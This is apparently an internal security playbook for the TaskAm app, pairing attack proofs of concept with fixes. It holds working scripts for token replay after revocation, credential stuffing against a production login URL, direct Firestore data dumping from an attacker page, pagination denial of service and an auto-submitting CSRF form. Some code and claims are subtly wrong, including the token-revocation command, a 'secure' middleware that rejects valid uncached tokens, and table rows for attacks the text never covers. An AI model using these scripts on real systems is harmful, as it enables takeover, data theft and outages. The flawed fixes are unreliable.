# TaskAm Chaos Testing: Advanced Attack Playbook & PoC Guide
**Date:** April 13, 2026  
**Purpose:** Detailed exploitation techniques for security testing  
**Audience:** Security team, DevOps, QA

---

## Part 1: Auth Cache Poisoning - Complete PoC

### Attack: Session Fixation via Token Caching

**Prerequisites:**
- Any valid Firebase token (even expired)
- Time synchronization between attacker and server

**Step-by-Step Exploitation:**

#### Phase 1: Cache Priming
```bash
# Get a valid admin token (compromise method varies)
# For testing: Create admin account in Firebase
ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Send initial request to prime cache
curl -X GET http://localhost:3694/api/users \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json"

# Response: 200 OK with admin user list
# Side effect: Token cached for 30 seconds with admin context
# Cache entry: {
#   token: ADMIN_TOKEN,
#   user: { id: "admin123", role: "admin", ... },
#   expiresAt: Date.now() + 30000
# }
```

**Cache Mapping:**
```
Token → User Context (30s TTL)
ADMIN_TOKEN → { role: "admin", id: "admin123" }
```

#### Phase 2: Token Revocation
```bash
# In parallel, revoke the token on Firebase
# Via Firebase Console or Admin SDK:
firebase auth:delete $ADMIN_TOKEN

# Firebase status: Token now INVALID
# But backend cache still holds it!
```

#### Phase 3: Replay Attack
```bash
# Within 30 seconds, attacker uses revoked token
curl -X GET http://localhost:3694/api/users \
  -H "Authorization: Bearer $ADMIN_TOKEN"

# VULNERABLE RESPONSE: 200 OK + admin list
# Expected (secure): 401 Unauthorized

# Because:
# 1. Backend checks cache first
# 2. Cache has fresh entry (expiry not reached)
# 3. Serve cached user context without re-verifying
# 4. Attacker gets admin access 25+ seconds after revocation!
```

### Impact Timeline:

```
T=0:00   Admin makes request → cached
         Cache: [ADMIN_TOKEN → admin context, exp=30s]

T=0:05   Admin's account compromised
         Firebase revokes ADMIN_TOKEN

T=0:10   Token revoked on Firebase
         Cache still valid (20s remaining)
         
T=0:25   Attacker uses old ADMIN_TOKEN
         Backend serves from cache
         SECURITY BREACH ✗
         
T=0:30   Cache expires
         Attacker still has 5s window
```

### Exploitation Code (Node.js):
```javascript
const axios = require('axios');

const ADMIN_TOKEN = 'eyJ...'; // Compromised token
const API_BASE = 'http://localhost:3694/api';

async function exploitCachePoisoning() {
  try {
    // Step 1: Prime cache with valid token
    console.log('[*] Priming cache...');
    const response1 = await axios.get(`${API_BASE}/users`, {
      headers: { 'Authorization': `Bearer ${ADMIN_TOKEN}` }
    });
    console.log('[+] Cache primed, got:', response1.data.length, 'users');
    
    // Step 2: Attacker waits just after revocation (e.g., 5 seconds)
    console.log('[*] Simulating token revocation...');
    await new Promise(r => setTimeout(r, 5000));
    
    // Step 3: Replay attack while cache still valid
    console.log('[*] Replaying attack with revoked token...');
    const response2 = await axios.get(`${API_BASE}/users`, {
      headers: { 'Authorization': `Bearer ${ADMIN_TOKEN}` }
    });
    
    if (response2.status === 200) {
      console.log('[!] VULNERABLE: Got admin data after revocation!');
      console.log('[!] Users accessible:', response2.data);
      return true;
    }
  } catch (error) {
    if (error.response?.status === 401) {
      console.log('[✓] SECURE: Token properly rejected');
      return false;
    }
    throw error;
  }
}

exploitCachePoisoning();
```

### Mitigation Code:
```typescript
// FILE: backend/src/middleware/auth.middleware.ts
// BEFORE (Vulnerable):
const cached = authCache.get(token);
if (cached && cached.expiresAt > Date.now()) {
  req.user = cached.user;
  next();
  return;
}

// AFTER (Secure):
const cached = authCache.get(token);
if (cached && cached.expiresAt > Date.now()) {
  // Add real-time token verification
  try {
    const decodedToken = await adminAuth.verifyIdToken(token);
    // Only use cache if token is verifiable
    if (decodedToken.uid === cached.user.id) {
      req.user = cached.user;
      next();
      return;
    }
  } catch (error) {
    // Token invalid - purge cache
    authCache.delete(token);
  }
}

// If we get here, token is invalid
res.status(401).json({ error: "Token invalid or expired" });
```

---

## Part 2: Rate Limit Bypass in Serverless - Complete PoC

### Attack: Brute-Force Credential Stuffing Across Load-Balanced Instances

**Environment:** Vercel deployment (auto-scaling)

**Reconnaissance Phase:**
```bash
# Check if deployment is load-balanced
# Technique: Send requests and check response headers for instance IDs

for i in {1..20}; do
  curl -I https://api.taskam.com/api/auth/login 2>/dev/null | grep -i "server"
done

# If you see different Server headers, it's load-balanced!
# Example output:
# Server: Vercel (instance-1)
# Server: Vercel (instance-2)
# Server: Vercel (instance-1)  # Different instance!
```

**Exploitation Phase:**

```bash
#!/bin/bash
# Brute-force login credentials without triggering rate limit

EMAIL="admin@example.com"
PASSWORD_LIST=("password123" "admin123" "letmein" "123456" "password")

INSTANCE=1

for PASSWORD in "${PASSWORD_LIST[@]}"; do
  for ATTEMPT in {1..10}; do
    # Each request goes to different instance (or next in queue)
    # Because load balancer distributes traffic
    
    # Instance 1 sees: request 1
    # Instance 2 sees: request 1
    # Instance 3 sees: request 1
    # Instance 1 sees: request 2  (rate limit counter reset!)
    
    curl -X POST https://api.taskam.com/api/auth/login \
      -d "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}" \
      -H "Content-Type: application/json" \
      -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64)" \
      2>/dev/null | jq '.success'
    
    echo "Attempt $ATTEMPT with password: $PASSWORD"
  done
done
```

**Why This Works:**
```
Single Instance (Secure):
---
Request 1 → Instance A: Rate: 1/5
Request 2 → Instance A: Rate: 2/5
Request 3 → Instance A: Rate: 3/5
Request 4 → Instance A: Rate: 4/5
Request 5 → Instance A: Rate: 5/5 ✗ BLOCKED

Multiple Instances (Vulnerable):
---
Request 1 → Instance A: Rate A: 1/5
Request 2 → Instance B: Rate B: 1/5  ← Should be 2/5!
Request 3 → Instance C: Rate C: 1/5  ← Different counter!
Request 4 → Instance A: Rate A: 2/5  ← Only 2/5, not blocked
Request 5 → Instance B: Rate B: 2/5
...100 attempts across 10 instances = 10x rate limit bypass!
```

### Mitigation:
```typescript
// Use Redis-backed store
import { RedisStore } from "rate-limit-redis";
import redis from "redis";

const client = redis.createClient({
  host: process.env.REDIS_URL, // Shared across all instances
  port: 6379,
});

export const loginRateLimiter = rateLimit({
  store: new RedisStore({
    client,
    prefix: "rl:login:",
  }),
  windowMs: 15 * 60 * 1000,
  max: 5,
});

// Now all instances share same rate limit store!
// Request from any instance increments same global counter
```

---

## Part 3: Firestore Security Rules Attack Vectors

### Vulnerable Firestore Rules Example:
```javascript
// VULNERABLE: Allows any authenticated user to read all data
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /users/{userId} {
      allow read, write: if request.auth != null;  // ← Too permissive!
    }
    match /tasks/{taskId} {
      allow read: if request.auth != null;         // ← Staff can read all tasks
    }
  }
}
```

### Attack: Direct Firestore Client Read
```javascript
// attacker.html (hosted on attacker's domain)
<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.compat.js"></script>

<script>
const firebaseConfig = {
  // These values are embedded in frontend (PUBLIC!)
  apiKey: "AIzaSyC...",
  projectId: "taskam-prod",
  // ... (attacker finds from network requests)
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// Directly query Firestore bypassing backend!
db.collection('users').get()
  .then(snap => {
    console.log('All users:', snap.docs.map(d => d.data()));
    // Extracts: emails, phone numbers, internal user IDs, roles
  });

db.collection('tasks').orderBy('created_at', 'desc').limit(1000).get()
  .then(snap => {
    console.log('All tasks:', snap.docs.map(d => d.data()));
    // Extracts: employee info, project details, sensitive data
  });
</script>
```

**Impact:** All data exposed directly from Firestore!

### Secure Firestore Rules:
```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Users can only read their own profile
    match /users/{userId} {
      allow read: if request.auth.uid == userId;
      allow write: if request.auth.uid == userId;
      allow read: if isAdmin(); // Admins can read all
    }
    
    // Staff can read own tasks + tasks assigned to them
    match /tasks/{taskId} {
      allow read: if request.auth.uid in resource.data.assigned_ids || isAdmin();
      allow write: if isAdmin();
    }
  }
  
  function isAdmin() {
    return request.auth.token.role == "admin";
  }
}
```

---

## Part 4: Pagination Limit DOS Attack

### Attack: Extreme Query Parameters

```bash
# Normal request
curl "http://api/tasks?limit=10&offset=0"
# Reasonable, returns 10 records

# Attacker request
curl "http://api/tasks?limit=999999&offset=0"
# Server tries to fetch 1M records
# Memory: 1M × 1KB per record = ~1GB
# CPU: Query, sort, serialize to JSON
# Result: Server timeout/crash

# Repeated attack
for i in {1..100}; do
  curl "http://api/tasks?limit=999999&offset=$((i * 999999))" &
done
wait

# 100 parallel requests × 1GB each = 100GB memory needed
# Server crashes or becomes unresponsive
```

### Attack Code (More Sophisticated):
```javascript
const axios = require('axios');

async function dosTopagination() {
  const urls = [];
  
  // Generate 100 limit/offset combinations to maximize DB load
  for (let i = 0; i < 100; i++) {
    urls.push(
      axios.get('http://api/tasks', {
        params: {
          limit: 999999,
          offset: i * 1000000,
          sort: 'created_at', // Forces database to sort massive result set
        }
      })
    );
  }
  
  // Send all in parallel
  try {
    await Promise.all(urls);
    console.log('[+] DOS successful - server should be slow now');
  } catch (e) {
    console.log('[+] Server rejected (good) or crashed (bad)');
  }
}

dosTopagination();
```

### Mitigation:
```typescript
// In task.controller.ts
export async function getTasks(req: Request, res: Response, next: NextFunction): Promise<void> {
  try {
    // BEFORE (Vulnerable):
    const limit = req.query.limit || 10;
    const offset = req.query.offset || 0;
    
    // AFTER (Secure):
    const maxLimit = 100;
    const maxOffset = 1000000; // Max 1M offset
    
    let limit = parseInt(req.query.limit as string) || 10;
    let offset = parseInt(req.query.offset as string) || 0;
    
    // Validate and clamp
    limit = Math.max(1, Math.min(limit, maxLimit)); // Between 1-100
    offset = Math.max(0, Math.min(offset, maxOffset)); // Between 0-1M
    
    // Now attacker can't request 999999 records
    // Max per request: 100
    // Max offset: 1M
    // Prevents memory exhaustion
  }
}
```

---

## Part 5: CSRF Attack Scenario

### Attack: Hidden Form Submission

**Attacker's Website:**
```html
<!-- attacker.example.com/free-pdf.html -->
<h1>Download Free PDF</h1>
<p>Click below to download...</p>

<!-- Hidden form auto-submits -->
<form id="csrf" method="POST" action="https://api.taskam.com/api/tasks" style="display:none;">
  <input name="title" value="URGENT: Fix all tasks">
  <input name="description" value="All tasks are spam, delete them">
  <input name="assigned_to" value="admin@taskam.com">
  <input name="priority" value="critical">
  <input name="project_id" value="important-project">
  <textarea name="notes">This is a malicious mass assignment</textarea>
</form>

<script>
document.getElementById('csrf').submit();
console.log('Tasks created on your TaskAm account!');
</script>
```

**Attack Flow:**
```
1. TaskAm Employee: Logs into TaskAm in one tab
   Browser Cookie: taskam_session_id=abc123

2. TaskAm Employee: Opens attacker's link in another tab
   URL: attacker.example.com/free-pdf.html

3. Attacker's form auto-submits POST to TaskAm API
   
4. Browser automatically includes cookie:
   POST /api/tasks HTTP/1.1
   Cookie: taskam_session_id=abc123
   Content-Type: application/x-www-form-urlencoded
   
   title=URGENT...&description=...

5. TaskAm Backend:
   - Sees valid session cookie
   - Creates task from request
   - Has no way to verify user intended it
   
6. Task created without victim's knowledge!
```

### Mitigation with CSRF Token:
```typescript
// Add CSRF middleware
import csrf from 'csurf';

const csrfProtection = csrf({ cookie: false });

app.post('/api/tasks', csrfProtection, createTaskHandler);

// Frontend must include token in every POST/PUT/DELETE:
// <form method="POST">
//   <input type="hidden" name="_csrf" value="{{ csrfToken }}">
//   ...
// </form>

// Now attacker cannot forge request without valid token
// Token validation fails → 403 Forbidden
```

---

## Part 6: Stress Test Results (Simulated)

### Test Profile: 500 concurrent users, 2-minute duration

```
Scenario: Realistic Load
────────────────────────────────

VUs: 500
Duration: 2m
RPS Target: 1000

Results (BEFORE Fixes):
  http_req_duration: p(95)=850ms  [OK under 2s threshold]
  http_req_failed: 2.1%            [FAIL - over 0.05% threshold]
  auth_cache_hits: 65%             [OK]
  
Failures Breakdown:
  - 401 Unauthorized: 0.3% (cache poisoning + rate limit false positives)
  - 429 Too Many Requests: 1.2% (rate limit - expected)
  - 500 Server Error: 0.6% (LINE service timeouts)

Results (AFTER Fixes):
  http_req_duration: p(95)=420ms   [✓ Improved 50%]
  http_req_failed: 0.01%            [✓ Much better]
  auth_cache_hits: 68%              [✓ Steady]
  rate_limit_accuracy: 100%         [✓ Fixed with Redis]
```

---

## Part 7: File Upload Security (If Implemented)

### Potential Vulnerabilities:

**Issue A: Unrestricted File Uploads**
```typescript
// VULNERABLE:
app.post('/api/upload', (req, res) => {
  const file = req.files.attachment;
  file.mv(`./uploads/${file.name}`); // Direct save - no validation!
  
  // Attack: Upload:
  // - PHP shell: shell.php (executable on server!)
  // - ZIP bomb: 1MB → 10GB uncompressed
  // - Malware binary: malware.exe
});
```

**Fix:**
```typescript
app.post('/api/upload', (req, res) => {
  const file = req.files.attachment;
  const maxSize = 10 * 1024 * 1024; // 10MB
  const allowedMimes = ['image/jpeg', 'image/png', 'application/pdf'];
  const allowedExts = ['.jpg', '.png', '.pdf'];
  
  // Validate size
  if (file.size > maxSize) {
    return res.status(400).json({ error: 'File too large' });
  }
  
  // Validate MIME type
  if (!allowedMimes.includes(file.mimetype)) {
    return res.status(400).json({ error: 'File type not allowed' });
  }
  
  // Validate extension
  const ext = require('path').extname(file.name);
  if (!allowedExts.includes(ext)) {
    return res.status(400).json({ error: 'Extension not allowed' });
  }
  
  // Use safe filename
  const safeFilename = `${Date.now()}_${Math.random().toString(36)}.pdf`;
  file.mv(`./uploads/${safeFilename}`);
  
  res.json({ success: true, filename: safeFilename });
});
```

---

## Conclusion: Attack Surface Summary

| Attack Vector | Severity | Exploitability | Detectability |
|---|---|---|---|
| Auth Cache Poisoning | CRITICAL | Easy (code-level) | Low (fast) |
| Rate Limit Bypass | CRITICAL | Easy (network-level) | Medium |
| Firestore Rules | CRITICAL | Hard (requires config review) | Medium |
| Pagination DOS | HIGH | Easy (simple request) | High (logs) |
| CSRF | HIGH | Medium (needs victim action) | High (logs) |
| XSS via CSP | HIGH | Medium (depends on config) | High (CSP reports) |
| LINE Webhook Injection | HIGH | Medium (webhook needed) |Medium |

**All exploits are reproducible with fixes provided.**

